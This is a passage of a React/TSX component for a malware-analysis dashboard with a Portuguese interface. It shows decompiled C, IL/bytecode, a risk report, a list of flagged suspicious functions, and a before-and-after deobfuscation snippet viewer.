                      <div className="mt-1.5 text-[10px] text-muted-foreground">
                        A categoria <strong>Obfuscation</strong> do relatório reflete os indicadores ou trechos que os botões &quot;Ver trechos obfuscados&quot; / &quot;Ver trechos deobfuscados&quot; mostram.
                      </div>
                    )}
                  </div>

                  {/* Dois cartões à direita, navegáveis com setas */}
                  <div className="md:col-span-2 h-full flex flex-col">
                    <div className="flex items-center justify-center gap-1 mb-1">
                      <button
                        type="button"
                        onClick={() =>
                          setOverviewCategoryIndex((prev) =>
                            (prev - 1 + reportCategories.length) % reportCategories.length
                          )
                        }
                        className="rounded border border-border bg-card px-1.5 py-0.5 text-muted-foreground hover:bg-secondary/70 hover:text-foreground disabled:opacity-40"
                        aria-label="Categorias anteriores"
                        disabled={reportCategories.length <= 1}
                      >
                        <ChevronLeft className="h-3 w-3" />
                      </button>
                      <span className="text-[10px] text-muted-foreground">
                        {reportCategories.length > 0
                          ? `${((overviewCategoryIndex % reportCategories.length) + reportCategories.length) % reportCategories.length + 1}/${reportCategories.length}`
                          : "0/0"}
                      </span>
                      <button
                        type="button"
                        onClick={() =>
                          setOverviewCategoryIndex((prev) =>
                            (prev + 1) % reportCategories.length
                          )
                        }
                        className="rounded border border-border bg-card px-1.5 py-0.5 text-muted-foreground hover:bg-secondary/70 hover:text-foreground disabled:opacity-40"
                        aria-label="Próximas categorias"
                        disabled={reportCategories.length <= 1}
                      >
                        <ChevronRight className="h-3 w-3" />
                      </button>
                    </div>
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 h-full items-stretch">
                      {[0, 1].map((offset) => {
                        if (reportCategories.length === 0) return null;
                        const base =
                          ((overviewCategoryIndex % reportCategories.length) +
                            reportCategories.length) %
                          reportCategories.length;
                        const idx = (base + offset) % reportCategories.length;
                        const cat = reportCategories[idx];
                        const [titlePart, ...rest] = cat.label.split(":");
                        const title = titlePart?.trim() || "Categoria de risco";
                        const description = rest.join(":").trim();
                        return (
                          <motion.div
                            key={cat.id}
                            layout
                            initial={{ opacity: 0, y: 8 }}
                            animate={{ opacity: 1, y: 0 }}
                            transition={{ duration: 0.32, ease: "easeOut" }}
                            className="rounded-lg border border-border bg-card/70 px-3 py-2 flex flex-col gap-0.5 h-full"
                          >
                            <span className="text-[10px] uppercase tracking-wide text-muted-foreground/80">
                              Categoria de risco do relatório
                            </span>
                            <span className="text-xs font-semibold text-foreground">
                              {title}
                            </span>
                            {description && (
                              <span className="text-[11px] text-muted-foreground">
                                {description}
                              </span>
                            )}
                          </motion.div>
                        );
                      })}
                    </div>
                    {reportResumoLines && (
                      <div className="mt-2">
                        <div className="rounded-lg border border-border bg-card/70 px-3 py-2 flex flex-col gap-0.5 h-full">
                          <span className="text-[10px] uppercase tracking-wide text-muted-foreground/80">
                            Resumo de comportamento
                          </span>
                          {reportResumoLines.map((line, idx) => (
                            <span
                              key={idx}
                              className="text-[11px] text-muted-foreground"
                            >
                              {line}
                            </span>
                          ))}
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              )}

              {/* 3 Colunas: C, IL e Relatório. A barra "Funções suspeitas" só aparece em fullscreen (painel C expandido). */}
              <div className="grid grid-cols-1 gap-4 lg:grid-cols-3" style={{ height: "calc(100vh - 200px)" }}>
                <div className="flex flex-col min-h-0">
                  {flaggedFunctionsSorted.length > 0 && (
                    <div className="mb-2 flex items-center justify-between gap-2 rounded-lg border border-border bg-card/70 px-3 py-2 text-[11px] font-mono">
                      <span className="text-muted-foreground">
                        Funções suspeitas:{" "}
                        <span className="text-foreground font-semibold">
                          {activeFlaggedFunctionIndex + 1}/{flaggedFunctionsSorted.length}
                        </span>
                        {activeFlaggedFunction?.name ? (
                          <span className="text-muted-foreground">
                            {" "}
                            · {activeFlaggedFunction.name}
                          </span>
                        ) : null}
                      </span>
                      <div className="flex items-center gap-1">
                        <button
                          type="button"
                          onClick={() =>
                            selectFlaggedFunction(activeFlaggedFunctionIndex - 1, { scroll: true })
                          }
                          className="rounded border border-border bg-card px-1.5 py-0.5 text-muted-foreground hover:bg-secondary/70 hover:text-foreground disabled:opacity-40"
                          aria-label="Função suspeita anterior"
                          disabled={flaggedFunctionsSorted.length <= 1}
                        >
                          <ChevronLeft className="h-3 w-3" />
                        </button>
                        <button
                          type="button"
                          onClick={() =>
                            selectFlaggedFunction(activeFlaggedFunctionIndex + 1, { scroll: true })
                          }
                          className="rounded border border-border bg-card px-1.5 py-0.5 text-muted-foreground hover:bg-secondary/70 hover:text-foreground disabled:opacity-40"
                          aria-label="Próxima função suspeita"
                          disabled={flaggedFunctionsSorted.length <= 1}
                        >
                          <ChevronRight className="h-3 w-3" />
                        </button>
                      </div>
                    </div>
                  )}
                  <CodePanel
                    title="Código C"
                    language="C"
                    code={result?.cCode ?? ""}
                    icon={<Code2 className="h-3.5 w-3.5 text-primary" />}
                    scrollToLine={scrollToLine}
                    displayLineRanges={(flaggedFunctionsSorted.length > 0 ? activeCDisplayRange : undefined) ?? undefined}
                    highlightedLineRange={highlightedLineRange}
                    flaggedIndicators={result?.flaggedIndicators ?? undefined}
                    functionHighlights={cFunctionHighlights}
                    downloadFileName={result?.cCode != null ? `${baseDownloadName}.c` : undefined}
                    maxInitialLines={800}
                    showDisplayRangesNotice
                    onExpand={() => { setScrollToLine(null); setWindowFocusLine(null); setExpandedPanel("c"); }}
                  />
                </div>
                <CodePanel
                  title="IL / Bytecode"
                  language="MSIL"
                  code={result?.ilCode ?? ""}
                  icon={<FileCode2 className="h-3.5 w-3.5 text-accent" />}
                  hideLimitNotice
                  downloadFileName={result?.ilCode != null ? `${baseDownloadName}.il` : undefined}
                  onExpand={() => { setScrollToLine(null); setWindowFocusLine(null); setExpandedPanel("il"); }}
                />
                <CodePanel
                  title="Relatório"
                  language="report"
                  code={result?.report ?? ""}
                  icon={<FileText className="h-3.5 w-3.5 text-code-string" />}
                  downloadFileName={result?.report != null ? `${baseDownloadName}-report.txt` : undefined}
                  onExpand={() => { setScrollToLine(null); setWindowFocusLine(null); setExpandedPanel("report"); }}
                />
              </div>

              {/* Vista expandida: ecrã inteiro com flags à esquerda e código à direita */}
              <AnimatePresence>
                {expandedPanel && (
                  <motion.div
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    exit={{ opacity: 0 }}
                    className="fixed inset-0 z-50 flex bg-background"
                  >
                    {/* Barra superior com título, botões de trechos (só no painel C) e fechar */}
                    <div className="absolute left-0 right-0 top-0 z-10 flex items-center justify-between border-b border-border bg-card/95 px-4 py-2 backdrop-blur-sm">
                      <span className="font-mono text-sm font-medium text-muted-foreground">
                        {expandedPanel === "c" && "Código C"}
                        {expandedPanel === "il" && "IL / Bytecode"}
                        {expandedPanel === "report" && "Relatório"}
                      </span>
                      <div className="flex items-center gap-2">
                        {expandedPanel === "c" && (
                          <button
                            type="button"
                            onClick={async () => {
                              const jobId = resultJobId ?? lastExternalJobId;
                              const reportText = result?.report ?? "";
                              const fallbackFromReport = extractObfuscationIndicatorsFromReport(reportText);
                              if (!jobId) {
                                const fallbackContent = fallbackFromReport
                                  ? `${fallbackFromReport}\n\n---\nPara ver trechos de código (antes/depois), abra a análise com o link do job (?jobId=...).`
                                  : "Trechos disponíveis apenas quando a análise é aberta através do link do job (?jobId=...).";
                                setSnippetModal({ open: true, title: fallbackFromReport ? "Indicadores de ofuscação (do relatório)" : "Antes / Depois da deobfuscação", pairs: [], currentIndex: 0, fallbackContent });
                                return;
                              }
                              setSnippetModal((s) => ({ ...s, open: true, title: "A carregar…", pairs: [], currentIndex: 0 }));
                              try {
                                const [resObf, resDeob] = await Promise.all([
                                  fetch(`${API_BASE}/api/analysis/${jobId}/artifacts/obfuscated_snippets?variant=obfuscated`),
                                  fetch(`${API_BASE}/api/analysis/${jobId}/artifacts/obfuscated_snippets?variant=deobfuscated`),
                                ]);
                                const textObf = resObf.ok ? await resObf.text() : "";
                                const textDeob = resDeob.ok ? await resDeob.text() : "";
                                const isIndicatorListObf = /Indicadores de ofuscação detetados/i.test(textObf);
                                const isIndicatorListDeob = /Indicadores de ofuscação detetados/i.test(textDeob);
                                if (isIndicatorListObf || isIndicatorListDeob) {
                                  const fallbackContent = (textObf || textDeob) + "\n\n---\nNão existe ficheiro de trechos de código para este job. Os itens acima são os indicadores que contam para a categoria Obfuscation do score.";
                                  setSnippetModal({ open: true, title: "Indicadores de ofuscação (categoria Obfuscation)", pairs: [], currentIndex: 0, fallbackContent });
                                  return;
                                }
                                const obfSections = parseSnippetFileSections(textObf);
                                const deobSections = parseSnippetFileSections(textDeob);
                                const pairs = zipSnippetPairs(obfSections, deobSections);
                                if (pairs.length > 0) {
                                  setSnippetModal({ open: true, title: "Antes / Depois da deobfuscação", pairs, currentIndex: 0 });
                                  return;
                                }
                                const fallbackContent = (resObf.ok || resDeob.ok)
                                  ? (textObf || textDeob)
                                  : (fallbackFromReport
                                    ? `${fallbackFromReport}\n\n---\nNão existe ficheiro de trechos para este job. Os itens acima são os indicadores que contam para a categoria Obfuscation do score.`
                                    : "Nenhuns trechos guardados para este job.");
                                setSnippetModal({ open: true, title: "Antes / Depois da deobfuscação", pairs: [], currentIndex: 0, fallbackContent });
                              } catch (e) {
                                setSnippetModal({ open: true, title: "Erro", pairs: [], currentIndex: 0, fallbackContent: e instanceof Error ? e.message : "Erro ao obter trechos." });
                              }
                            }}
                            className="inline-flex items-center gap-1 rounded border border-primary/40 bg-primary/10 px-2 py-1.5 text-[11px] font-mono text-primary hover:bg-primary/20"
                          >
                            <FileSearch className="h-3.5 w-3.5" />
                            Ver antes / depois da deobfuscação
                          </button>
                        )}
                        <button
                          type="button"
                          onClick={() => {
                            setExpandedPanel(null);
                            setScrollToLine(null);
                            setWindowFocusLine(null);
                            setSelectedWord(null);
                          }}
                          className="rounded-lg border border-border bg-secondary p-2 text-muted-foreground transition-colors hover:bg-secondary/80 hover:text-foreground"
                          aria-label="Fechar"
                        >
                          <X className="h-4 w-4" />
                        </button>
                      </div>
                    </div>

                    {/* Coluna esquerda: navegação/contexto (largura redimensionável) */}
                    <div
                      className="flex shrink-0 flex-col border-r border-border bg-card/80 pt-12"
                      style={{ width: leftColWidth }}
                    >
                      <div className="border-b border-border px-3 py-2">
                        <h3 className="font-mono text-xs font-semibold text-muted-foreground">
                          {expandedPanel === "c" && "Funções suspeitas"}
                          {expandedPanel === "il" && "Navegação"}
                          {expandedPanel === "report" && "Marcadores do relatório"}
                        </h3>
                      </div>
                      <div className="flex-1 overflow-auto p-2">
                        {expandedPanel === "c" ? (
                          (() => {
                            if (flaggedFunctionsSorted.length === 0) {
                              return (
                                <p className="text-xs text-muted-foreground">
                                  Nenhuma função suspeita identificada.
                                </p>
                              );
                            }

                            return (
                              <div className="space-y-2">
                                <div className="flex items-center justify-between gap-2 rounded-md border border-border bg-card/60 px-2 py-1.5 text-[11px] font-mono text-muted-foreground">
                                  <span className="select-none">Ordem</span>
                                  <select
                                    value={flaggedFunctionsOrder}
                                    onChange={(e) => setFlaggedFunctionsOrder(e.target.value as "code" | "severity")}
                                    className="rounded border border-border bg-card px-2 py-1 text-[11px] text-foreground"
                                    aria-label="Ordenação das funções suspeitas"
                                  >
                                    <option value="code">Chegada no código</option>
                                    <option value="severity">Severidade (score)</option>
                                  </select>
                                </div>
                                <div className="flex items-center justify-between gap-2 rounded-md border border-border bg-card/60 px-2 py-1.5 text-[11px] font-mono text-muted-foreground">
                                  <span>
                                    {activeFlaggedFunctionIndex + 1}/{flaggedFunctionsSorted.length}
                                  </span>
                                  <div className="flex items-center gap-1">
                                    <button
                                      type="button"
                                      onClick={() =>
                                        selectFlaggedFunction(activeFlaggedFunctionIndex - 1, { scroll: true })
                                      }
                                      className="rounded border border-border bg-card px-1.5 py-0.5 text-muted-foreground hover:bg-secondary/70 hover:text-foreground disabled:opacity-40"
                                      aria-label="Função anterior"
                                      disabled={flaggedFunctionsSorted.length <= 1}
                                    >
                                      <ChevronLeft className="h-3 w-3" />
                                    </button>
                                    <button
                                      type="button"
                                      onClick={() =>
                                        selectFlaggedFunction(activeFlaggedFunctionIndex + 1, { scroll: true })
                                      }
                                      className="rounded border border-border bg-card px-1.5 py-0.5 text-muted-foreground hover:bg-secondary/70 hover:text-foreground disabled:opacity-40"
                                      aria-label="Próxima função"
                                      disabled={flaggedFunctionsSorted.length <= 1}
                                    >
                                      <ChevronRight className="h-3 w-3" />
                                    </button>
                                  </div>
                                </div>
                                <ul className="space-y-1">
                                  {flaggedFunctionsSorted.map((f, idx) => (
                                  <li key={`${f.id ?? ""}-${f.name}-${f.startLine}-${f.endLine}-${idx}`}>
                                    <button
                                      type="button"
                                      onClick={() => {
                                        selectFlaggedFunction(idx, { scroll: true });
                                      }}
                                      className={`w-full rounded-md px-2 py-1.5 text-left text-[11px] text-foreground transition-colors hover:bg-secondary/80 flex flex-col items-start gap-0.5 ${
                                        activeCFunctionId &&
                                        activeCFunctionId === ((f.id && f.id.trim()) || `${f.name}:${f.startLine}-${f.endLine}`)
                                          ? "bg-primary/10 border border-primary/30"
                                          : "border border-transparent"
                                      }`}
                                    >
                                      <span className="font-medium">
                                        {idx + 1}. {f.name || "função suspeita"} (linhas {f.startLine}–{f.endLine})
                                      </span>
                                      {(typeof f.score === "number" || f.severity) && (
                                        <span className="text-[10px] text-muted-foreground">
                                          {f.severity ? `Severidade: ${f.severity}` : null}
                                          {f.severity && typeof f.score === "number" ? " · " : null}
                                          {typeof f.score === "number" ? `Score (0-100): ${f.score}/100` : null}
                                          {typeof f.scoreRaw === "number" && typeof f.score === "number" && f.scoreRaw > 100
                                            ? ` · bruto: ${f.scoreRaw}`
                                            : null}
                                        </span>
                                      )}
                                      {f.indicators && f.indicators.length > 0 && (
                                        <span className="text-[10px] text-muted-foreground">
                                          Indicadores: {Array.from(new Set(f.indicators)).join(", ")}
                                        </span>
                                      )}
                                      {f.reasons && f.reasons.length > 0 && (() => {
                                        const firstNonIndicators = f.reasons.find((r) => {
                                          const t = (r ?? "").toString().trim();
                                          if (!t) return false;
                                          return !/^indicadores?\s*:/i.test(t);
                                        });
                                        return firstNonIndicators ? (
                                          <span className="text-[10px] text-muted-foreground">
                                            {firstNonIndicators}
                                          </span>
                                        ) : null;
                                      })()}
                                    </button>
                                  </li>
                                ))}
                              </ul>
                              </div>
                            );
                          })()
                        ) : expandedPanel === "report" ? (
                          reportChapters.length === 0 ? (
                            <p className="text-xs text-muted-foreground">
                              Nenhum marcador no relatório.
                            </p>
                          ) : (
                            <ul className="space-y-1">
                              {reportChapters.map((chapter, idx) => (
                                <li key={`${chapter.label}-${chapter.line}-${idx}`}>
                                  <button
                                    type="button"
                                    onClick={() => setScrollToLine(chapter.line)}
                                  className="w-full rounded-md px-2 py-1.5 text-left text-[11px] text-foreground transition-colors hover:bg-secondary/80 hover:text-foreground"
                                  >
                                    {chapter.label}
                                  </button>
                                </li>
                              ))}
                            </ul>
                          )
                        ) : (
                          <p className="text-xs text-muted-foreground">
                            Navegação específica não disponível para este painel.
                          </p>
                        )}
                      </div>
                    </div>
                    <div
                      role="separator"
                      aria-label="Redimensionar coluna esquerda"
                      onMouseDown={handleLeftResizeStart}
                      className="w-1 shrink-0 cursor-col-resize select-none border-r border-border bg-transparent hover:bg-primary/30 transition-colors"
                    />

                    {/* Coluna do meio: código (preenche o espaço; largura definida pelo utilizador) */}
                    <div className="flex min-w-0 flex-1 flex-col pt-12">
                      {expandedPanel === "c" && (
                        <CodePanel
                          title="Código C"
                          language="C"
                          code={result?.cCode ?? ""}
                          icon={<Code2 className="h-3.5 w-3.5 text-primary" />}
                          scrollToLine={scrollToLine}
                          compactHeader
                          displayLineRanges={(flaggedFunctionsSorted.length > 0 ? activeCDisplayRange : undefined) ?? undefined}
                          highlightedLineRange={highlightedLineRange}
                          permanentHighlightRanges={(flaggedFunctionsSorted.length > 0 ? activeCDisplayRange : undefined) ?? undefined}
                          flaggedIndicators={result?.flaggedIndicators ?? undefined}
                          functionHighlights={cFunctionHighlights}
                          onViewportLineChange={(line) => {
                            // Mantém a seleção da sidebar coerente com o que está no viewport,
                            // mas sem fazer auto-scroll (senão "salta" durante o scroll).
                            const idx = getFlaggedFunctionIndexForLine(line);
                            if (idx >= 0 && idx !== activeFlaggedFunctionIndex) {
                              selectFlaggedFunction(idx, { scroll: false });
                            } else if (idx >= 0) {
                              const f = flaggedFunctionsSorted[idx];
                              const fid = (f.id && f.id.trim()) || `${f.name}:${f.startLine}-${f.endLine}`;
                              setActiveCFunctionId(fid);
                            }
                          }}
                          selectedWord={selectedWord ?? undefined}
                          onWordSelect={expandedPanel === "c" ? handleWordSelect : undefined}
                          downloadFileName={result?.cCode != null ? `${baseDownloadName}.c` : undefined}
                          maxInitialLines={2000}
                        />
                      )}
                      {expandedPanel === "il" && (
                        <CodePanel
                          title="IL / Bytecode"
                          language="MSIL"
                          code={result?.ilCode ?? ""}
                          icon={<FileCode2 className="h-3.5 w-3.5 text-accent" />}
                          scrollToLine={scrollToLine}
                          compactHeader
                          highlightedLineRange={highlightedLineRange}
                          selectedWord={selectedWord ?? undefined}
                          onWordSelect={expandedPanel === "il" ? handleWordSelect : undefined}
                          downloadFileName={result?.ilCode != null ? `${baseDownloadName}.il` : undefined}
                        />
                      )}
                      {expandedPanel === "report" && (
                        <CodePanel
                          title="Relatório"
                          language="report"
                          code={result?.report ?? ""}
                          icon={<FileText className="h-3.5 w-3.5 text-code-string" />}
                          scrollToLine={scrollToLine}
                          compactHeader
                          downloadFileName={result?.report != null ? `${baseDownloadName}-report.txt` : undefined}
                        />
                      )}
                    </div>

                    {/* Resizer + coluna direita: só aparecem quando uma palavra está selecionada */}
                    <AnimatePresence>
                      {showReferences && (
                        <>
                          <div
                            role="separator"
                            aria-label="Redimensionar coluna direita"
                            onMouseDown={handleRightResizeStart}
                            className="w-1 shrink-0 cursor-col-resize select-none border-r border-border bg-transparent hover:bg-primary/30 transition-colors"
                          />
                          <motion.div
                            initial={{ opacity: 0, x: 40 }}
                            animate={{ opacity: 0.4 + referencesProgress * 0.6, x: 0 }}
                            exit={{ opacity: 0, x: 40 }}
                            transition={{ duration: 0.25 }}
                            className="flex shrink-0 flex-col border-l border-border bg-card/80 pt-12"
                            style={{ width: rightColWidth }}
                          >
                            <div className="flex items-center justify-between border-b border-border px-3 py-2">
                              <h3 className="font-mono text-xs font-semibold text-muted-foreground">
                                Referências
                              </h3>
                              <button
                                type="button"
                                onClick={() => setSelectedWord(null)}
                                className="rounded p-1 text-muted-foreground hover:bg-muted hover:text-foreground"
                                aria-label="Fechar referências"
                              >
                                <X className="h-3.5 w-3.5" />
                              </button>
                            </div>
                            <div className="flex flex-1 flex-col gap-3 overflow-auto p-3">
                              <div className="rounded border border-border/50 bg-muted/30 px-2 py-1.5 font-mono text-sm font-medium text-foreground break-all">
                                {selectedWord}
                              </div>
                              {wordStats && (
                                <>
                                  <div className="text-[11px] text-muted-foreground">
                                    {expandedPanel === "c" ? (
                                      <>
                                        <button
                                          type="button"
                                          onClick={openXrefExplorerFromSidebar}
                                          className="group inline rounded px-0.5 -mx-0.5 hover:bg-primary/15 transition-colors align-baseline"
                                          title="Abrir mapa de xrefs (pseudo-C) num novo separador"
                                        >
                                          <span className="font-medium text-foreground tabular-nums group-hover:text-primary group-hover:underline decoration-primary/60 underline-offset-2">
                                            {wordStats.mentions}
                                          </span>
                                        </button>{" "}
                                        menção
                                        {wordStats.mentions !== 1 ? "ões" : ""} no código
                                      </>
                                    ) : (
                                      <>
                                        <span className="font-medium text-foreground">{wordStats.mentions}</span>{" "}
                                        menção
                                        {wordStats.mentions !== 1 ? "ões" : ""} no código
                                      </>
                                    )}
                                  </div>
                                  {wordStats.inferredType && (
                                    <div className="text-[11px] text-muted-foreground">
                                      Tipo: <span className="text-foreground">{wordStats.inferredType}</span>
                                    </div>
                                  )}
                                  <div className="text-[11px] text-muted-foreground">
                                    Em{" "}
                                    <span className="font-medium text-foreground">{wordStats.functionsCount}</span>{" "}
                                    {wordStats.functionsCount !== 1 ? "funções" : "função"}
                                  </div>
                                  {expandedPanel === "c" && wordStats.maliciousCount > 0 && (
                                    <div className="text-[11px] text-destructive">
                                      Em{" "}
                                      <span className="font-semibold">{wordStats.maliciousCount}</span>{" "}
                                      {wordStats.maliciousCount !== 1 ? "funções suspeitas" : "função suspeita"}
                                    </div>
                                  )}
                                </>
                              )}
                            </div>
                            {/* Barra de tempo fluida no fundo da coluna */}
                            <div className="mt-auto px-3 pb-2 pt-1">
                              <div className="h-1.5 w-full rounded-full bg-border/40 overflow-hidden">
                                <motion.div
                                  className="h-full bg-primary"
                                  animate={{ width: `${referencesProgress * 100}%` }}
                                  transition={{ duration: 0.2, ease: "linear" }}
                                />
                              </div>
                            </div>
                          </motion.div>
                        </>
                      )}
                    </AnimatePresence>
                  </motion.div>
                )}
              </AnimatePresence>
            </motion.div>
          )}
        </AnimatePresence>

        <Dialog open={snippetModal.open} onOpenChange={(open) => setSnippetModal((s) => ({ ...s, open }))}>
          <DialogContent className="max-w-5xl max-h-[90vh] overflow-hidden flex flex-col">
            <DialogHeader>
              <DialogTitle className="font-mono text-sm">{snippetModal.title}</DialogTitle>
            </DialogHeader>
            {snippetModal.pairs.length > 0 ? (
              <>
                <div className="flex items-center justify-center gap-3 py-2 border-b border-border">
                  <button
                    type="button"
                    onClick={() => setSnippetModal((s) => ({ ...s, currentIndex: (s.currentIndex - 1 + s.pairs.length) % s.pairs.length }))}
                    className="rounded-lg border border-border bg-secondary p-2 text-muted-foreground transition-colors hover:bg-secondary/80 hover:text-foreground disabled:opacity-40"
                    disabled={snippetModal.pairs.length <= 1}
                    aria-label="Caso anterior"
                  >
                    <ChevronLeft className="h-4 w-4" />
                  </button>
                  <span className="text-xs font-mono text-muted-foreground min-w-[8rem] text-center">
                    Caso {snippetModal.currentIndex + 1} de {snippetModal.pairs.length}
                  </span>
                  <button
                    type="button"
                    onClick={() => setSnippetModal((s) => ({ ...s, currentIndex: (s.currentIndex + 1) % s.pairs.length }))}
                    className="rounded-lg border border-border bg-secondary p-2 text-muted-foreground transition-colors hover:bg-secondary/80 hover:text-foreground disabled:opacity-40"
                    disabled={snippetModal.pairs.length <= 1}
                    aria-label="Próximo caso"
                  >
                    <ChevronRight className="h-4 w-4" />
                  </button>
                </div>
                {snippetModal.pairs[snippetModal.currentIndex]?.description && (
                  <p className="text-[11px] text-muted-foreground font-mono px-1">
                    {snippetModal.pairs[snippetModal.currentIndex].description}
                  </p>
                )}
                <div className="grid grid-cols-2 gap-3 flex-1 min-h-0 overflow-hidden">
                  <div className="flex flex-col min-h-0 rounded border border-border bg-muted/20">
                    <div className="px-2 py-1.5 border-b border-border text-[10px] font-mono uppercase tracking-wide text-muted-foreground">
                      Antes (obfuscado)
                    </div>
                    <pre className="flex-1 overflow-auto p-3 text-[11px] font-mono whitespace-pre-wrap break-words">
                      {snippetModal.pairs[snippetModal.currentIndex]?.before || "—"}
                    </pre>
                  </div>
                  <div className="flex flex-col min-h-0 rounded border border-border bg-muted/20">
                    <div className="px-2 py-1.5 border-b border-border text-[10px] font-mono uppercase tracking-wide text-muted-foreground">
                      Depois (deobfuscado)
                    </div>
                    <pre className="flex-1 overflow-auto p-3 text-[11px] font-mono whitespace-pre-wrap break-words">
                      {snippetModal.pairs[snippetModal.currentIndex]?.after || "—"}
                    </pre>
                  </div>
                </div>
              </>
            ) : (
              <pre className="flex-1 overflow-auto rounded border border-border bg-muted/30 p-3 text-[11px] font-mono whitespace-pre-wrap break-words">
                {snippetModal.fallbackContent ?? "—"}
              </pre>
            )}
          </DialogContent>
        </Dialog>
      </main>
    </div>
  );
};

export default Index;
